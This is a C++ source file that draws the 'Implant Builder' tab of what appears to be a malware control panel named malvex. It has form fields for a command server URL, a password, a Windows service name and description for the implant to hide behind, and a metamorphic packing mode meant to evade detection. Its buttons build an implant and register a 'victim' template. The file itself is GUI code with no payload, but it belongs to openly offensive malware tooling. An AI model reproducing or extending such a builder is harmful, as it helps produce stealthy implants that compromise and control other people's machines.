#include "UiShared.hpp"
#include "FileBrowser.hpp"
#include "LogManager.hpp"
#include "Util/SafeString.hpp"
#include <Metamorphic/PackMode.hpp>

#include <format>

void drawBuilderTab(WindowState& state) {
    static FileBrowser fb{FileBrowser::Mode::SELECT_DIRECTORY};
    static bool server_url_was_editing = false;
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    auto& settings = state.implant_settings;
    const auto& res = state.res;

    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "Implant Builder");

    Rectangle form_panel = ui::section_content(page);
    ui::draw_panel_frame(form_panel, panel_fill, panel_border);

    ui::FormLayout form{ui::panel_body(form_panel, false)};

    GuiLabel(form.label_rect(), "Username:");
    if (GuiTextBox(form.field_rect(), settings.username.text, MAX_INPUT_CHARS, settings.username.edit)) {
        settings.username.edit = !settings.username.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Password:");
    if (GuiTextBox(form.field_rect(), settings.password.text, MAX_INPUT_CHARS, settings.password.edit)) {
        settings.password.edit = !settings.password.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Timeout:");
    if (GuiTextBox(form.field_rect(), settings.default_timeout.text, MAX_INPUT_CHARS, settings.default_timeout.edit)) {
        settings.default_timeout.edit = !settings.default_timeout.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Server:");
    if (GuiTextBox(form.field_rect(), settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
        settings.server_url.edit = !settings.server_url.edit;
    }
    if (server_url_was_editing && !settings.server_url.edit) {
        state.builder.setServerURL(settings.server_url.text);
        static_cast<void>(malvex::safe_copy(settings.server_url.text, sizeof(settings.server_url.text), state.builder.getServerURL()));
    }
    server_url_was_editing = settings.server_url.edit;
    form.next_row();

    GuiLabel(form.label_rect(), "Output Dir:");
    if (GuiTextBox(form.field_rect(0.72f), settings.output_file_path.text, MAX_INPUT_CHARS, settings.output_file_path.edit)) {
        settings.output_file_path.edit = !settings.output_file_path.edit;
    }
    if (GuiButton({form.field_rect().x + form.field_rect(0.72f).width + ui::kGap, form.field_rect().y, form.field_rect().width * 0.28f - ui::kGap, form.row_height}, "Browse...")) {
        fb.open();
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Service:");
    if (GuiTextBox(form.field_rect(), settings.service_name.text, MAX_INPUT_CHARS, settings.service_name.edit)) {
        settings.service_name.edit = !settings.service_name.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Description:");
    if (GuiTextBox(form.field_rect(), settings.service_description.text, MAX_INPUT_CHARS, settings.service_description.edit)) {
        settings.service_description.edit = !settings.service_description.edit;
    }
    form.next_row();

    GuiLabel(form.label_rect(), "Packing:");
    if (GuiComboBox(
            form.field_rect(),
            metamorphic::kPackModeComboLabels,
            &settings.pack_mode) > 0) {
        state.builder.setPackModeIndex(settings.pack_mode);
    }
    form.next_row();

    if (GuiButton({form.field_x + 230.0f, form.cursor_y, 250.0f, ui::kControlHeight}, "Register Victim User")) {
        auto& logs = LogManager::instance();
        state.builder.setServerURL(settings.server_url.text);
        static_cast<void>(malvex::safe_copy(settings.server_url.text, sizeof(settings.server_url.text), state.builder.getServerURL()));

        logs.attack_log(std::format("Registering Victim Template: {}", settings.username.text));

        if (state.client.registerTemplate(settings.username.text, settings.password.text)) {
            logs.attack_log("SUCCESS: Registred Victim Template!");
        }
    }

    if (GuiButton({form.field_x, form.cursor_y, 220.0f, ui::kControlHeight}, "Build Implant")) {
        state.builder.setUsername(settings.username.text);
        if (!state.builder.getPassword().starts_with("$pbkdf2-sha256$")) {
            state.builder.setPassword(settings.password.text);
        }
        state.builder.setServerURL(settings.server_url.text);
        state.builder.setTimeout(settings.default_timeout.text);
        state.builder.setServiceName(settings.service_name.text);
        state.builder.setServiceDesc(settings.service_description.text);
        state.builder.setOutputDir(settings.output_file_path.text);
        state.builder.setPackModeIndex(settings.pack_mode);

        state.builder.buildImplant();
    }

    fb.render();

    if (not fb.is_open() && not fb.get_selected_path().empty()) {
        static_cast<void>(malvex::safe_copy(settings.output_file_path.text, sizeof(settings.output_file_path.text), fb.get_selected_path()));
        fb.clear();
    }
}
